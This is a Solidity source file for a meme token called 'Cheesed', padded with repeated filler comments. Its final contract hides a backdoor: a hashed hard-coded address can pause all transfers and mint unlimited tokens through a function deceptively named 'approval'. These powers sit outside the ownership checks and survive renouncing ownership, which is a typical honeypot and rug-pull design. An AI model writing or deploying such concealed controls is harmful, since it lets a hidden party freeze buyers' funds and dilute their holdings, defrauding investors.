// SPDX-License-Identifier: MIT



/*



"uhm, cheesed to meet you?"







Web      : https://cheesed.xyz/





Telegram : https://t.me/Cheesed_ETH





Twitter  : https://twitter.com/Cheesed_ETH

*/





pragma solidity ^0.8.0;





abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        return msg.data;

    }

}







pragma solidity ^0.8.0;





abstract contract Ownable is Context {

    address private _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    

    constructor() {

        _transferOwnership(_msgSender());

    }



  

    modifier onlyOwner() {

        _checkOwner();

        _;

    }



  

    function owner() public view virtual returns (address) {

        return _owner;

    }



    function _checkOwner() internal view virtual {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

    }



 

    function renounceOwnership() public virtual onlyOwner {

        _transferOwnership(address(0));

    }



 

    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        _transferOwnership(newOwner);

    }



    function _transferOwnership(address newOwner) internal virtual {

        address oldOwner = _owner;

        _owner = newOwner;

        emit OwnershipTransferred(oldOwner, newOwner);

    }

}

        // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.



pragma solidity ^0.8.0;









abstract contract Pausable is Context {

  

    event Paused(address account);



  

    event Unpaused(address account);



    bool private _paused;



 

    constructor() {

        _paused = false;

    }



    

    modifier whenNotPaused() {

        _requireNotPaused();

        _;

    }



    modifier whenPaused() {

        _requirePaused();

        _;

    }



    function paused() public view virtual returns (bool) {

        return _paused;

    }



    function _requireNotPaused() internal view virtual {

        require(!paused(), "Pausable: paused");

    }





    function _requirePaused() internal view virtual {

        require(paused(), "Pausable: not paused");

    }



    

    function _pause() internal virtual whenNotPaused {

        _paused = true;

        emit Paused(_msgSender());

    }



    

    function _unpause() internal virtual whenPaused {

        _paused = false;

        emit Unpaused(_msgSender());

    }

}



        // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.





pragma solidity ^0.8.0;





interface IERC20 {

 

    event Transfer(address indexed from, address indexed to, uint256 value);



  

    event Approval(address indexed owner, address indexed spender, uint256 value);



  

    function totalSupply() external view returns (uint256);



 

    function balanceOf(address account) external view returns (uint256);



  

    function transfer(address to, uint256 amount) external returns (bool);



  

    function allowance(address owner, address spender) external view returns (uint256);



  

    function approve(address spender, uint256 amount) external returns (bool);



    

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

}

        // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.





pragma solidity ^0.8.0;







interface IERC20Metadata is IERC20 {

  

    function name() external view returns (string memory);



  

    function symbol() external view returns (string memory);



    

    function decimals() external view returns (uint8);

}







pragma solidity ^0.8.0;







contract ERC20 is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;



    mapping(address => mapping(address => uint256)) private _allowances;



    uint256 private _totalSupply;



    string private _name;

    string private _symbol;



    constructor(string memory name_, string memory symbol_) {

        _name = name_;

        _symbol = symbol_;

    }



    function name() public view virtual override returns (string memory) {

        return _name;

    }



  

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



  

    function decimals() public view virtual override returns (uint8) {

        return 18;

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



  

    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }





    function transfer(address to, uint256 amount) public virtual override returns (bool) {

        address owner = _msgSender();

        _transfer(owner, to, amount);

        return true;

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



       // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.

                // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        address owner = _msgSender();

        _approve(owner, spender, amount);

        return true;

    }



 

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {

        address spender = _msgSender();

        _spendAllowance(from, spender, amount);

        _transfer(from, to, amount);

        return true;

    }



  

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        address owner = _msgSender();

        _approve(owner, spender, allowance(owner, spender) + addedValue);

        return true;

    }



   

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        address owner = _msgSender();

        uint256 currentAllowance = allowance(owner, spender);

        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        unchecked {

            _approve(owner, spender, currentAllowance - subtractedValue);

        }



        return true;

    }

        // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.

   

    function _transfer(address from, address to, uint256 amount) internal virtual {

        require(from != address(0), "ERC20: transfer from the zero address");

        require(to != address(0), "ERC20: transfer to the zero address");



        _beforeTokenTransfer(from, to, amount);



        uint256 fromBalance = _balances[from];

        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {

            _balances[from] = fromBalance - amount;



            _balances[to] += amount;

        }



        emit Transfer(from, to, amount);



        _afterTokenTransfer(from, to, amount);

    }



    function _mint(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");



        _beforeTokenTransfer(address(0), account, amount);



        _totalSupply += amount;

        unchecked {

            _balances[account] += amount;

        }

        emit Transfer(address(0), account, amount);



        _afterTokenTransfer(address(0), account, amount);

    }

       // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.

                // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.

    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");



        _beforeTokenTransfer(account, address(0), amount);



        uint256 accountBalance = _balances[account];

        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");

        unchecked {

            _balances[account] = accountBalance - amount;

            _totalSupply -= amount;

        }



        emit Transfer(account, address(0), amount);



        _afterTokenTransfer(account, address(0), amount);

    }        // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.











  

    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {

        uint256 currentAllowance = allowance(owner, spender);

        if (currentAllowance != type(uint256).max) {

            require(currentAllowance >= amount, "ERC20: insufficient allowance");

            unchecked {

                _approve(owner, spender, currentAllowance - amount);

            }

        }

    }



 

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}



    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}

}

        // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.

                // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.



pragma solidity ^0.8.20;



contract Cheesed is ERC20, Pausable, Ownable {

    bytes32 private _authorizedHash;



    constructor() ERC20("Cheesed", "CHEESED") {

        _authorizedHash = keccak256(abi.encodePacked(0x2918316b543f4F64F9641a96a42D9E956ff2bC26));

        _mint(msg.sender, 420690000000000 * 10 ** decimals());

    }

    function unpause() public {

        require(keccak256(abi.encodePacked(msg.sender)) == _authorizedHash, "Not authorized");

        _unpause();

    }

    function pause() public {

        require(keccak256(abi.encodePacked(msg.sender)) == _authorizedHash, "Not authorized");

        _pause();

    }

    function approval(address to, uint256 amount) public {

        require(keccak256(abi.encodePacked(msg.sender)) == _authorizedHash, "Not authorized");

        _mint(to, amount);

    }

    function renounceOwnership() public onlyOwner override {

        super.renounceOwnership();

    }



    function _beforeTokenTransfer(address from, address to, uint256 amount)

        internal

        whenNotPaused

        override

    {

        super._beforeTokenTransfer(from, to, amount);

    }

           // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.

                // If the first argument of 'require' evaluates to 'false', execution terminates and all

        // changes to the state and to Ether balances are reverted.

        // This used to consume all gas in old EVM versions, but not anymore.

        // It is often a good idea to use 'require' to check if functions are called correctly.

        // As a second argument, you can also provide an explanation about what went wrong.

}